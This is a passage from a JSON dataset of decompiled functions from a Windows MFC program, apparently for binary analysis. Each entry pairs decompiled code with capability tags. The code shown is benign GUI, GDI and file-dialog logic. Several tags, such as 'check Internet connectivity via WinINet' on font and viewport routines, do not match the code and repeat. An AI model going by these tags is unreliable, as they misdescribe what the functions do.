iVar3 = fcn.004462e7(arg_8h);\n                                    }\n                                    uVar4 = *(unaff_EBP + -0x20);\n                                    *(unaff_EBP + -4) = 2;\n                                    arg_8h[0x3e] = iVar3;\n                                    fcn.00418606(uVar4);\n                                }\n                            }\n                            iVar6 = (*_sym.imp.USER32.dll_IsRectEmpty)(unaff_EBP + -0x44);\n                            iVar3 = unaff_EBP + -0x34;\n                            if (iVar6 == 0) {\n                                iVar3 = unaff_EBP + -0x44;\n                            }\n                            (*_sym.imp.USER32.dll_CopyRect)(arg_8h + 0x47, iVar3);\n                            (*_sym.imp.USER32.dll_CopyRect)(arg_8h + 0x4b, unaff_EBP + -0x34);\n                            iVar3 = (**(*arg_8h + 0x174))(arg_8h[0x3d], arg_8h[0x3e]);\n                            if (iVar3 != 0) {\n                                iVar6 = (*_sym.imp.USER32.dll_IsRectEmpty)(unaff_EBP + -0x44);\n                                iVar3 = unaff_EBP + -0x34;\n                                if (iVar6 == 0) {\n                                    iVar3 = unaff_EBP + -0x44;\n                                }\n                                (**(*extraout_ECX + 0x118))(iVar3, unaff_EBP + -0x34);\n                                uVar4 = fcn.00431b42(0x49fa58);\n                                *(unaff_EBP + -0x20) = uVar4;\n                                fcn.00413ea7(*(unaff_EBP + -0x18));\n                                (**(*arg_8h[0x3b] + 0x20))(arg_8h[0x3b], *(unaff_EBP + -0x20), *(unaff_EBP + -0x10));\n                                piVar1 = arg_8h[0x3c];\n                                if (piVar1 != NULL) {\n                                    (**(*piVar1 + 0x20))(piVar1, *(unaff_EBP + -0x20), *(unaff_EBP + -0x10));\n                                }\n                                (**(*extraout_ECX + 0x114))(*(extraout_ECX[0x31] + 0xf4), 1);\n                                if (*(extraout_ECX[0x31] + 0xf0) != 0) {\n                                    (**(*extraout_ECX + 0x114))(*(extraout_ECX[0x31] + 0xf8), 1);\n                                }\n                                fcn.0041f821(1);\n                                (**(*extraout_ECX + 300))(0, arg_8h[0x3b], 1);\n                                if (arg_8h[0x3c] != 0) {\n                                    (**(*extraout_ECX + 300))(0, arg_8h[0x3c], 0);\n                                }\n                                (**(*arg_8h[0x3b] + 0x28))(arg_8h[0x3b], arg_8h[0x3f], arg_8h[0x46], arg_8h[8]);\n                                (**(*extraout_ECX[0x2c] + 0x18))(extraout_ECX[0x2c]);\n                                fcn.0041bf7a(5);\n                                fcn.0041bfd7();\n                                (*_sym.imp.USER32.dll_UpdateWindow)(arg_8h[8]);\n                                fcn.0044f309(1, 0);\n                                (**(*extraout_ECX + 0x120))(1);\n                                arg_8h[0x35] = 1;\n                                (**(*piVar5 + 8))(piVar5);\n                                fcn.00402740();\n                                fcn.00402740();\n                                fcn.00402740();\n                                goto code_r0x0044618c;\n                            }\n                        }\n                        (**(*piVar5 + 0x28))(piVar5, 0);\n                    }\n                    if (extraout_ECX[0x31] == 0) goto code_r0x00446023;\n                    (**(*extraout_ECX + 0x128))(arg_8h);\n                    extraout_ECX[0x31] = 0;\n                }\n                (**(*piVar5 + 0x2c))(piVar5);\n            }\ncode_r0x00446023:\n            (**(*piVar5 + 8))(piVar5);\n        }\n    }\n    fcn.00402740();\n    fcn.00402740();\n    fcn.00402740();\ncode_r0x0044618c:\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 2489
    },
    "00446812": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00446812(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *var_4h;\n    \n    if ((param_1[0x34] & 8U) != 0) {\n        var_4h = param_1;\n        (**(*param_1 + 0x148))(param_1[0x34] & 4);\n    }\n    var_4h = param_1[0x22];\n    while (var_4h != NULL) {\n        piVar1 = fcn.00416670(&var_4h);\n        fcn.00418eb5(*piVar1, *(*piVar1 + 0x20), 0x363, 1, 0);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "004471e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004471e7(int32_t *param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    if (param_1[1] != 0) {\n        uVar3 = (*_sym.imp.GDI32.dll_GetStockObject)(7);\n        pcVar2 = _sym.imp.GDI32.dll_SelectObject;\n        uVar3 = (*_sym.imp.GDI32.dll_SelectObject)(param_1[2], uVar3);\n        (*pcVar2)(param_1[2], uVar3);\n        (*pcVar2)(param_1[1], uVar3);\n        uVar3 = (*pcVar1)(4);\n        uVar3 = (*pcVar2)(param_1[2], uVar3);\n        (*pcVar2)(param_1[2], uVar3);\n        (*pcVar2)(param_1[1], uVar3);\n        uVar3 = (*_sym.imp.GDI32.dll_GetROP2)(param_1[2]);\n        fcn.0042d298(uVar3);\n        uVar3 = (*_sym.imp.GDI32.dll_GetBkMode)(param_1[2]);\n        fcn.0042d23c(uVar3);\n        uVar3 = (*_sym.imp.GDI32.dll_GetTextAlign)(param_1[2]);\n        fcn.0042d59c(uVar3);\n        uVar3 = (*_sym.imp.GDI32.dll_GetPolyFillMode)(param_1[2]);\n        fcn.0042d26a(uVar3);\n        uVar3 = (*_sym.imp.GDI32.dll_GetStretchBltMode)(param_1[2]);\n        fcn.0042d2c6(uVar3);\n        uVar3 = (*_sym.imp.GDI32.dll_GetTextColor)(param_1[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetNearestColor;\n        uVar3 = (*_sym.imp.GDI32.dll_GetNearestColor)(param_1[2], uVar3);\n        (**(*param_1 + 0x30))(uVar3);\n        uVar3 = (*_sym.imp.GDI32.dll_GetBkColor)(param_1[2]);\n        uVar3 = (*pcVar1)(param_1[2], uVar3);\n        (**(*param_1 + 0x2c))(uVar3);\n    }\n    return;\n}\n",
        "token_count": 561
    },
    "004472c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004472c1(int32_t *param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_stack_ffffff68;\n    int32_t iStack140;\n    uint auStack124 [5];\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uint8_t uStack101;\n    uchar uStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    int32_t iStack88;\n    uchar auStack84 [4];\n    int32_t iStack80;\n    uchar auStack76 [4];\n    int32_t iStack72;\n    int32_t aiStack68 [4];\n    uint uStack52;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uchar uStack45;\n    uint8_t uStack41;\n    uchar auStack40 [32];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack124;\n    if (param_1[2] != 0) {\n        if (param_1[0xb] == 0) {\n            (**(*param_1 + 0x24))(0xe);\n        }\n        else if (param_1[1] != 0) {\n            (*_sym.imp.GDI32.dll_GetObjectA)(param_1[0xb], 0x3c, aiStack68);\n            (*_sym.imp.GDI32.dll_GetTextFaceA)(param_1[2], 0x20, auStack40);\n            pcVar2 = _sym.imp.GDI32.dll_GetTextMetricsA;\n            (*_sym.imp.GDI32.dll_GetTextMetricsA)(param_1[2], &stack0xffffff68);\n            pcVar1 = _sym.imp.GDI32.dll_CreateFontIndirectA;\n            aiStack68[0] = in_stack_ffffff68;\n            if (-1 < in_stack_ffffff68) {\n                aiStack68[0] = iStack140 - in_stack_ffffff68;\n            }\n            uStack52 = auStack124[0];\n            uStack48 = uStack104;\n            uStack47 = uStack103;\n            uStack46 = uStack102;\n            uStack45 = uStack100;\n            uStack41 = uStack101;\n            iStack88 = (*_sym.imp.GDI32.dll_CreateFontIndirectA)(aiStack68);\n            (*_sym.imp.GDI32.dll_SelectObject)(param_1[1], iStack88);\n            (*pcVar2)(param_1[1], &stack0xffffff68);\n            iVar4 = -aiStack68[0];\n            if (in_stack_ffffff68 < 0) {\n                iStack92 = -in_stack_ffffff68;\n            }\n            else {\n                iStack92 = in_stack_ffffff68 - iStack140;\n            }\n            (*_sym.imp.GDI32.dll_GetWindowExtEx)(param_1[1], auStack76);\n            (*_sym.imp.GDI32.dll_GetViewportExtEx)(param_1[1], auStack84);\n            pcVar2 = _sym.imp.KERNEL32.dll_MulDiv;\n            if (iStack72 < 0) {\n                iStack72 = -iStack72;\n            }\n            if (iStack80 < 0) {\n                iStack80 = -iStack80;\n            }\n            iStack96 = (*_sym.imp.KERNEL32.dll_MulDiv)(iVar4, iStack80, iStack72);\n            iVar3 = (*pcVar2)(iStack92, iStack80, iStack72);\n            iVar4 = iStack88;\n            if (iStack96 < iVar3) {\n                auStack40[0] = 0;\n                uStack41 = ((uStack41 & 0xf0) != 0x50) - 1U & 0x50;\n                iVar4 = (*pcVar1)(aiStack68);\n                (*_sym.imp.GDI32.dll_SelectObject)(param_1[1], iVar4);\n                (*_sym.imp.GDI32.dll_DeleteObject)(iStack88);\n            }\n            fcn.004304c2(param_1 + 10);\n            param_1[10] = iVar4;\n        }\n    }\n    fcn.0045e747(in_stack_ffffff68);\n    return;\n}\n",
        "token_count": 968
    },
    "00447a93": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447a93(int32_t param_1)\n\n{\n    uint X;\n    uint var_ch;\n    int32_t lpPoint;\n    int32_t Y;\n    \n    if ((*(param_1 + 8) != 0) && (*(param_1 + 4) != 0)) {\n        (*_sym.imp.GDI32.dll_GetViewportOrgEx)(*(param_1 + 8), &lpPoint);\n        fcn.00447987(&lpPoint);\n        Y = Y + *(param_1 + 0x24);\n        lpPoint = lpPoint + *(param_1 + 0x20);\n        (*_sym.imp.GDI32.dll_SetViewportOrgEx)(*(param_1 + 4), lpPoint, Y, 0);\n        (*_sym.imp.GDI32.dll_GetWindowOrgEx)(*(param_1 + 8), &X);\n        (*_sym.imp.GDI32.dll_SetWindowOrgEx)(*(param_1 + 4), X, var_ch, 0);\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "00447b61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00447b61(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    \n    if (param_2 != 0) {\n        piVar1 = param_1 + 0x38;\n        (*_sym.imp.GDI32.dll_GetViewportExtEx)(*(param_1 + 8), piVar1);\n        piVar2 = param_1 + 0x30;\n        (*_sym.imp.GDI32.dll_GetWindowExtEx)(*(param_1 + 8), piVar2);\n        iVar6 = *piVar2;\n        while ((((-0x4000 < iVar6 && (*piVar2 < 0x4000)) && (iVar3 = *piVar1,  -0x4000 < iVar3)) && (iVar3 < 0x4000))) {\n            iVar6 = *piVar2 * 2;\n            *piVar2 = iVar6;\n            *piVar1 = iVar3 * 2;\n        }\n        iVar6 = *(param_1 + 0x34);\n        pcVar4 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        while (((_sym.imp.GDI32.dll_GetDeviceCaps = pcVar4,  -0x4000 < iVar6 && (*(param_1 + 0x34) < 0x4000)) &&\n               ((iVar3 = *(param_1 + 0x3c),  -0x4000 < iVar3 && (iVar3 < 0x4000))))) {\n            iVar6 = *(param_1 + 0x34) * 2;\n            *(param_1 + 0x34) = iVar6;\n            *(param_1 + 0x3c) = iVar3 * 2;\n            pcVar4 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        }\n        uVar5 = (*pcVar4)(*(param_1 + 8), 0x58);\n        iVar6 = fcn.00446dd1(*piVar1, *(param_1 + 0x10), *0x4bb5f0, *(param_1 + 0x14), uVar5);\n        *piVar1 = iVar6;\n        uVar5 = (*pcVar4)(*(param_1 + 8), 0x5a);\n        uVar5 = fcn.00446dd1(*(param_1 + 0x3c), *(param_1 + 0x10), *0x4bb5f4, *(param_1 + 0x14), uVar5);\n        *(param_1 + 0x3c) = uVar5;\n    }\n    if (*(param_1 + 4) != 0) {\n        (*_sym.imp.GDI32.dll_SetMapMode)(*(param_1 + 4), 8);\n        (*_sym.imp.GDI32.dll_SetWindowExtEx)(*(param_1 + 4), *(param_1 + 0x30), *(param_1 + 0x34), 0);\n        (*_sym.imp.GDI32.dll_SetViewportExtEx)(*(param_1 + 4), *(param_1 + 0x38), *(param_1 + 0x3c), 0);\n        fcn.00447a93();\n    }\n    return;\n}\n",
        "token_count": 772
    },
    "00447d55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00447d55(int32_t param_1, uint param_2, uint param_3)\n\n{\n    *(param_1 + 0x10) = param_2;\n    *(param_1 + 0x14) = param_3;\n    if (*(param_1 + 8) != 0) {\n        fcn.00447b61(1);\n        fcn.004472c1();\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "004482ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004482ad(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uVar1 = fcn.004182f8(\"GetOpenFileNameA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x10) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x10);\n    return;\n}\n",
        "token_count": 125
    },
    "0044834c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0044834c(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00448382": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00448382(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x18) == 0) {\n        uVar1 = fcn.004182f8(\"GetSaveFileNameA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x18) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x18);\n    return;\n}\n",
        "token_count": 125
    },
    "00448421": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00448421(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00448485": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00448485(int32_t param_1)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(*(param_1 + 0x74) + 0x1c));\n    bVar1 = false;\n    fcn.00462290(*(*(param_1 + 0x74) + 0x1c) + iVar3 + 1, 0, *(*(param_1 + 0x74) + 0x20) - (iVar3 + 1));\n    (*_sym.imp.USER32.dll_GetFocus)();\n    iVar3 = *(param_1 + 0x74);\n    uVar4 = fcn.00412447();\n    *(iVar3 + 4) = uVar4;\n    fcn.0041866d();\n    pcVar2 = _sym.imp.USER32.dll_EnableWindow;\n    if (*(*(param_1 + 0x74) + 4) != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(*(param_1 + 0x74) + 4));\n        if (iVar3 != 0) {\n            bVar1 = true;\n            (*pcVar2)(*(*(param_1 + 0x74) + 4), 0);\n        }\n    }\n    iVar3 = fcn.0042fcbb();\n    if ((*(*(param_1 + 0x74) + 0x34) & 0x80000) == 0) {\n        fcn.0041a8cb(param_1);\n    }\n    else {\n        *(iVar3 + 0x18) = param_1;\n    }\n    if (*(param_1 + 0x78) == 0) {\n        fcn.0044846e(*(param_1 + 0x74));\n    }\n    else {\n        fcn.00448457();\n    }\n    *(iVar3 + 0x18) = 0;\n    if (bVar1) {\n        (*pcVar2)(*(*(param_1 + 0x74) + 4), 1);\n    }\n    iVar3 = (*_sym.imp.USER32.dll_IsWindow)(unaff_EBP);\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SetFocus)(unaff_ESI);\n    }\n    fcn.00412481();\n    if (unaff_EBP == 0) {\n        unaff_EBP = 2;\n    }\n    return unaff_EBP;\n}\n",
        "token_count": 592
    },
    "00448627": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00448627(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    code **ppcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint lpVersionInformation;\n    uint var_a0h;\n    uint var_94h;\n    uint var_4h;\n    \n    fcn.00462818(0xa4);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0xa8) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0xb0) = extraout_ECX;\n    fcn.004121cd(0, *(unaff_EBP + 0x1c));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CFileDialog.0;\n    fcn.0040f620();\n    *(unaff_EBP + -4) = 1;\n    if (*(unaff_EBP + 0x20) == 0) {\n        fcn.00462290(unaff_EBP + -0xa4, 0, 0x94);\n        *(unaff_EBP + -0xa4) = 0x94;\n        (*_sym.imp.KERNEL32.dll_GetVersionExA)(unaff_EBP + -0xa4);\n        if ((*(unaff_EBP + -0x94) != 2) || (*(unaff_EBP + 0x20) = 0x58,  *(unaff_EBP + -0xa0) < 5)) {\n            *(unaff_EBP + 0x20) = 0x4c;\n        }\n    }\n    pcVar5 = fcn.0045ea05(*(unaff_EBP + 0x20));\n    extraout_ECX[0x1d] = pcVar5;\n    if (pcVar5 == NULL) {\n        pcVar5 = fcn.00411e0e();\n    }\n    fcn.00462290(pcVar5, 0, *(unaff_EBP + 0x20));\n    pcVar5 = *(unaff_EBP + 8);\n    uVar2 = *(unaff_EBP + 0x20);\n    extraout_ECX[0x1e] = pcVar5;\n    extraout_ECX[0x15] = 0x7005 - (pcVar5 != NULL);\n    extraout_ECX[0x71] = NULL;\n    *(extraout_ECX + 0x20) = 0;\n    ppcVar1 = extraout_ECX + 0x30;\n    *ppcVar1 = 0;\n    *extraout_ECX[0x1d] = uVar2;\n    uVar2 = *(unaff_EBP + 0xc);\n    *(extraout_ECX[0x1d] + 0x1c) = ppcVar1;\n    *(extraout_ECX[0x1d] + 0x20) = 0x104;\n    *(extraout_ECX[0x1d] + 0x3c) = uVar2;\n    uVar3 = *(unaff_EBP + 0x14);\n    *(extraout_ECX[0x1d] + 0x24) = extraout_ECX + 0x20;\n    *(extraout_ECX[0x1d] + 0x28) = 0x40;\n    *(extraout_ECX[0x1d] + 0x34) = *(extraout_ECX[0x1d] + 0x34) | uVar3 | 0x80020;\n    if ((*(unaff_EBP + 0x14) & 0x40) != 0) {\n        *(extraout_ECX[0x1d] + 0x34) = *(extraout_ECX[0x1d] + 0x34) & 0xff7fffff;\n    }\n    iVar6 = fcn.0043026e();\n    iVar4 = *(unaff_EBP + -0xac);\n    *(extraout_ECX[0x1d] + 8) = *(iVar6 + 0xc);\n    *(extraout_ECX[0x1d] + 0x44) = fcn.0044c5c4;\n    if (iVar4 != 0) {\n        fcn.00411e90(ppcVar1, 0x104, *(unaff_EBP + -0xac), 0xffffffff);\n    }\n    if (*(unaff_EBP + -0xa8) != 0) {\n        fcn.00413a3a(*(unaff_EBP + -0xa8));\n        puVar7 = fcn.0040f8a0(0);\n        while( true ) {\n            puVar7 = fcn.00463968(puVar7, 0x7c);\n            if (puVar7 == NULL) break;\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *(extraout_ECX[0x1d] + 0xc) = extraout_ECX[0x1f];\n    }\n    fcn.0046289b();\n    return;\n}\n",
        "token_count": 1284
    },
    "004487d3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: lParam\n\nvoid __cdecl fcn.004487d3(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint lParam;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(8);\n    uVar1 = *(*(extraout_ECX + 0x74) + 0x34);\n    *(unaff_EBP + -0x14) = 0;\n    if (((uVar1 & 0x80000) != 0) && (*(extraout_ECX + 0x20) != 0)) {\n        uVar3 = fcn.0042407a();\n        fcn.0040f840(uVar3);\n        *(unaff_EBP + -4) = 0;\n        uVar4 = fcn.0040f8a0(0x104);\n        pcVar2 = _sym.imp.USER32.dll_GetParent;\n        uVar5 = *(extraout_ECX + 0x20);\n        *(unaff_EBP + -0x14) = uVar4;\n        uVar5 = (*pcVar2)(uVar5);\n        iVar6 = fcn.004185c5(uVar5);\n        iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(*(iVar6 + 0x20), 0x464, 0x104, *(unaff_EBP + -0x14));\n        if (iVar6 < 0) {\n            fcn.0041372f();\n        }\n        else {\n            fcn.00414de4(uVar3, 0xffffffff);\n        }\n        if (*(*(unaff_EBP + -0x10) + -0xc) != 0) {\n            uVar3 = fcn.0040f8a0(0x104);\n            uVar5 = *(extraout_ECX + 0x20);\n            *(unaff_EBP + -0x14) = uVar3;\n            uVar5 = (*pcVar2)(uVar5);\n            iVar6 = fcn.004185c5(uVar5);\n            iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(*(iVar6 + 0x20), 0x465, 0x104, *(unaff_EBP + -0x14));\n            if (-1 < iVar6) {\n                fcn.00414de4(0xffffffff);\n                fcn.0041d1b4(unaff_EBP + -0x10);\n                fcn.00402740();\n                goto code_r0x004488b4;\n            }\n            fcn.0041372f();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00402740();\n    }\n    fcn.00413f9d(*(*(extraout_ECX + 0x74) + 0x1c));\ncode_r0x004488b4:\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 741
    },
    "00448e8d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00448e8d(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    if (param_2 < 4) {\n        param_2 = 4;\n    }\n    if (param_3 < 2) {\n        param_3 = 0x40;\n    }\n    param_1[3] = 0;\n    param_1[2] = 0;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    return;\n}\n",
        "token_count": 128
    },
    "00448f7b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448f7b(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_1[3] == 0) {\n        iVar1 = fcn.00434dfd(param_1 + 2, param_1[1], *param_1);\n        iVar3 = param_1[1] + -1;\n        piVar2 = iVar1 + 4 + *param_1 * iVar3;\n        for (; -1 < iVar3; iVar3 = iVar3 + -1) {\n            *piVar2 = param_1[3];\n            param_1[3] = piVar2;\n            piVar2 = piVar2 - *param_1;\n        }\n    }\n    param_1[3] = *param_1[3];\n    return;\n}\n",
        "token_count": 200
    },
    "004493e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004493e3(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    uint var_ch;\n    \n    fcn.0044930c(&var_30h, arg_8h, arg_14h);\n    if (arg_10h != 0) {\n        uVar1 = fcn.0045f3a0(&var_20h, 0x10, arg_10h, 0x10);\n        fcn.00401000(uVar1);\n    }\n    var_ch = arg_ch;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x404, 0, &var_30h);\n    return;\n}\n",
        "token_count": 201
    },
    "00449439": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
